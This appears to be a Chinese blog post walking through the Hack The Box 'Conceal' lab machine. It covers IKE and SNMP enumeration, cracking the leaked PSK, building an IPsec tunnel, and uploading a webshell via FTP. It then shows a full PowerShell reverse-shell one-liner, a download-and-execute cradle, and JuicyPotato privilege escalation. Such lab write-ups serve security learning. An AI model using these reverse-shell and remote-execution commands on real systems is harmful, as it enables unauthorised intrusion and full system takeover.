> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/JDyZX6orHKIuBpGmITxzyA)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **16** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/TT8ic2JKBb6jlK434RibHzNljr956UE1SoMjawkXtRicWE16SX040OVmERla7ia6PpRZEAhV7jXcq41cMGaXRibHy1A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/8MwpenCNAibmYVEdEYmTrUwKKp2e3RyLasUur0sQZ4lviaKFOwwgKfcp4pvbVNrpHrPoVhVEZjJ3IV0MAxQtbEZg/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/168

靶机难度：中级（5.0/10）

靶机发布日期：2019 年 5 月 8 日

靶机描述：

Conceal is a “hard” difficulty Windows which teaches enumeration of IKE protocol and configuring IPSec in transport mode. Once configured and working the firewall goes down and a shell can be uploaded via FTP and executed. On listing the hotfixes the box is found vulnerable to ALPC Task Scheduler LPE. Alternatively, SeImpersonatePrivilege granted to the user allows to obtain a SYSTEM shell.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

  

  

一、信息收集

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbs3aBtvyZaIicia5pE3TibPwhiaiaUVEtoYtyEHtndbBWEnUVvLxib4R8Pb1w/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.116.....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbeObHsqWyN8odgmSk2HvGUD8ibrpPbCyJibpPxPWZdHWKB4gia83m2W4hg/640?wx_fmt=png)

```
nmap -p- -T4 --min-rate=1000 10.10.10.116
```

可以看到，靶机没开 TCP 上运行，没开放端口... 查看下 UDP 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbRy8KKZv9WUibcABcEMGuHzBPLb8EOiajPbWPnGWozub4npNhY3DuvC6A/640?wx_fmt=png)

```
nmap -sU -T5 -p1-1000  10.10.10.116
```

发现 UDP 端口 500 已打开，该端口在执行脚本扫描时似乎正在运行 IKE，IKE 就是密匙交互协议...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbQJfY1pK6iamWiak7tHEibJwuLvfLxPNzd1R48iaL1Rl9aSQgNXuZe5S8TA/640?wx_fmt=png)

```
nmap -sC -sV  -T5 -p500 -sU  10.10.10.116
```

前面也说了 IKE 代表 Internet 密钥交换，该密钥用于在 IPSec 协议中建立安全连接....

这里开始 IKE 的渗透...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbXwGo9qLF5ibmltxB4pg1j6QCCFa46Pm4CbN6ccGormHL4C3iast8rsug/640?wx_fmt=png)

需要下载 apt install ike-scan...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSb7V2t1Qza4m00gbkuh9KoiakrbM8JIIqPcp6MmhIwQEJXMd8dTEYw7TA/640?wx_fmt=png)

```
ike-scan -M 10.10.10.116
```

获得了一些信息，例如加密类型 3DES，SHA1 哈希算法和 IKE 版本为 v1 等，需要建立在 Auth=PSK 值上，现在需要获得 PSK...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbpSd0PjZy53lrFibZEyXicOMdcTAfEcIBnBOkkEYD8Wg6ee3oCJSFG8Gg/640?wx_fmt=png)

```
snmpwalk -v2c -c public 10.10.10.116
```

这里利用 snmpwalk 进行枚举... 可以看到了 PSK 值...32 个字符.. 可能是 MD5 或者 NTLM 值...

```
9C8B1A372B1878851BE2C097031B6E43
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbNsZiccDnw5fc27wiapWv0MkAvzP1XwkA6Lkv4XuKic3hdoUqsX0HTDt4A/640?wx_fmt=png)

```
解码成功：Dudecake1!
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbwx2rgSF1ROUicdf2dnBHPPTjHdODWLXHro0kRraM2cQDpbuJD9egyqw/640?wx_fmt=png)

```
apt install -y strongswan
```

为了建立连接，使用 Strongswan，它可以用来配置 ipsec... 下载即可...

PSK 可以在 / etc/ipsec.secrets 中进行配置，直接导入即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbPVPUckqe7uAUwKw1BdGwFr7RLdZuCS9HPExlaPsJDYtZrpuicxBiblDA/640?wx_fmt=png)

接下来，打开 / etc/ipsec.conf 以配置链接参数即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbF1bveO1x5ibicTNvtZf6Sq4SuxsDkjIibgSDYmonzVF99qTcBO1OjWS6g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbcREQWvvYhGaEI4768fib4X14pfGTLmRmRlQ6RLDCBAZPm5icHFNOrESw/640?wx_fmt=png)

写入了一个隐蔽的隧道 ipsec... 按照前面 ike 获得的信息进行补充即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbnEzMHttrfwmPm3PQvOVledOic6cexEuoLlD8iaBfXniayJcNlicTLCcZOg/640?wx_fmt=png)

这里按照思路执行 ipsec start --nofork，开启后通道却报错了... 谷歌找了会，应该是 ipsec.conf 少填写了 TCP，然后接口需要跟着 ipsec.conf 的 int 走...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbys38yicPgG5h2T07zMdxEzE71MibiaeiaNGcQribYicTia4TsoD5zQlAeg5oA/640?wx_fmt=png)

添加 TCP 走向后，启动看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbR8RVORr2qFicOtj4KLNDlz49LzjS4AZBTgOyVBqzsDICMVpKm872SqA/640?wx_fmt=png)

```
ipsec start --nofork
```

可以看到本地发出的数据包，靶机回复了数据包...nmap 扫描 tcp 端口打开了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbxqJ2Sz0IyF91Jx22VtYeXDoc8HlLWLTTVBecJKps1WvFick3b5K5GgA/640?wx_fmt=png)

```
nmap -sT -F 10.10.10.116
```

开放了 FTP 和 HTTP 等服务...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbicZEia66d3gjDFEEJVTvrk52uBZDEKLQYIM3SGuwg08H1HmKcq8Sh7tQ/640?wx_fmt=png)

爆破发现了 upload 目录，果然...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbYmibJQicia8HZAlDtHn5fbcGduGfs6icd35BBSPSFwicKmSTtHvTP8fZwEA/640?wx_fmt=png)

我记得我做过一次类似的，存在此类的漏洞，FTP 和 web 的 upload 是共享的漏洞...

这里 gobuster 爆破也发现了存在 upload...

测试了下，可以看到存在漏洞...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbAjprlIHCPmay508XLNmjib6e5FhdwwzGfmTia0XoyULSweoAjlq3g52Q/640?wx_fmt=png)

开始找 webshell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbqZsdYCuFzpfjiaeibFejPpxiaIA7mWjy5HrXATRPg4v7sj2CNImDVwrlg/640?wx_fmt=png)

```
git clone https://github.com/tennc/webshell
```

这是一个强大的 webshell 库，里面各种各样的 shell 都有（路过的赶紧收藏吧）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbQmI8VHTNf8Ft0pPe8cdGKDFhGoogK6wTicudqferxB0ILEiatGKiamEiaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbt43Tr7dbsibq474xyOqibW8891NUM9kIcKibdBx7oK90unksicicAO93xZw/640?wx_fmt=png)

NO.60 我也介绍过类似的方法了..

利用 FTP 上传成功...

  

  

二、提权

  

  

到这一步就简单了，直接利用命令上传 nc 即可获得反弹 shell...

这里有点坑，每过 2 分钟就会自动清除掉 upload 里头的文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbLe2ZPrmHzg5EAoG6AffCBZR9cXmvSaGicQKswGVvI3tvv0uFtY6ictrg/640?wx_fmt=png)

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.18',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

直接输入命令即可... 开启 nc...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbu2jeYCAJbBB31MaUp4CsxObQVC24PZ45RSjLoIh9EOsVHEdKWNLJrw/640?wx_fmt=png)

或者利用 Invoke-PowerShellTcp.ps1 上传提权即可...

可以看到成功拿到低权 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbKfhblxxmC7SCurn9fFibOMdSMzgnsXZz4AKeCtmucjb1ZjnWdl2wQhw/640?wx_fmt=png)

成功获得第一个 users 的 flag...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSboRKGySnmq0sgFK2wvT8ia8icAbpIsFdeqMrc8Wy0r0Z39FmtyOeuwibCg/640?wx_fmt=png)

继续收集信息，这是一个 windows10 的系统... 而且是刚安装的，没打补丁的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbPZT0ial50ZRf7Yzbu4NFAaCbliaJUWicjoZgnxFpJfIeSlXKj4ucP45ew/640?wx_fmt=png)

```
whoami /all
```

可以发现拥有 SeImpersonatePrivilege 存在 RottenPotato 漏洞... 这里直接用 juicy-potato 即可...（juicy-potato 就是在 windows 拥有 SeImpersonatePrivilege 后做出的提权工具）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbmV5omMFHf4HPbSoGESxjmk2JA9VuH2ibTGng9yRibpdicE77KwbJ3MYIA/640?wx_fmt=png)

由于是 windows，我直接下载 EXE 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbZqulMu2blcza9Cs8icvZrEzNosQNBsB2uviaFaW2LvfIlyicF89MdZH0w/640?wx_fmt=png)

利用 FTP 或者 certutil -urlcache -split -f 上传即可... 这里有点坑，FTP 上传的东西一会就消失了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbsDORwQ5G5iayK2SrkdxEibdVAAfMVSbs91QH17VOwv8VBQZDH268bjXw/640?wx_fmt=png)

成功上传....

juicy-potato 就是利用 RottenPotato 漏洞修改 CLSID 值然后执行 BAT 程序提权....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbLicoykAsAEVwR5ic1w4QwsDjqk0ETPck3gqncyZ4a8nXvT0AxoJfe3JQ/640?wx_fmt=png)

执行发现了此台靶机的 CLSID 值后...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbRmbIgibmCGufFY8k9yrzTbZmDTJsgJhevntcPB4NLeZkJs9S99EUJ8A/640?wx_fmt=png)

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.18 -Port 8888
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbuKaJuibJZfeCtzpLI6eicl6vUPEpfPSDzz5lKLIscZt8UzuFGy1cvt0A/640?wx_fmt=png)

```
powershell "IEX (New-Object Net.WebClient).downloadString('http://10.10.14.18:8000/dayu.ps1')"
```

上传了 BAT，自己写的简单的上传 webshell 提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbh6o7MCGZB3zvAic0q6XXnhfeKe6jXeyRMy6zicRX07IdIR6Coyu1YuZw/640?wx_fmt=png)

```
.\dayu.exe -t * -p C:\users\Destitute\music\dayu.bat -l 4445
```

我这里先测试 4445 端口，发现是错误的 CLSID 值...10038

这里需要找到可利用的 CLSID 值，可参考 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md 或者 http://ohpe.it/juicy-potato/CLSID / 都可以找到...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbQU8r8vLaeknNw9L5SNmFC1gcZI1JvE98WOvMml6n2CrIoicpbpZbEMw/640?wx_fmt=png)

可以看到，此 CLSID 是无权限的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbuHUysRXHeIpORfUbRAvmBjIB2EmvGjVG3mTsQiaMbLPNSrdL5icsSvkA/640?wx_fmt=png)

只需要随意利用一个 CLSID 即可提权... 我随意用了一个...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbO85GYn9ZS1XKaobpWduvWKy26Jiax9E3aWGcndITp1JBxn4apiahicvUg/640?wx_fmt=png)

```
.\dayu.exe -t * -p C:\users\Destitute\music\dayu.bat -l 8889 -c '{8BC3F05E-D86B-11D0-A075-00C04FB68820}'
```

开启 NC，利用 dayu.ps1 的 shell 成功提权.... 

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOdGaEnMDrByuX1yDuhAQSbKR0f4VXlcVVU8znGDJTOFu0rIJrMc2ZqchDMicTib1BFshLD2QFFbeVw/640?wx_fmt=png)

成功查看到第二个 flag...

![](https://mmbiz.qpic.cn/mmbiz_png/TT8ic2JKBb6jlK434RibHzNljr956UE1SoMjawkXtRicWE16SX040OVmERla7ia6PpRZEAhV7jXcq41cMGaXRibHy1A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/8MwpenCNAibmYVEdEYmTrUwKKp2e3RyLasUur0sQZ4lviaKFOwwgKfcp4pvbVNrpHrPoVhVEZjJ3IV0MAxQtbEZg/640?wx_fmt=png)

这台靶机可以看到，对方是通过 IKE 加密传输封装了 TCP 协议，以 UDP 协议进行展示...

学到了挺多的... 加油！！

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)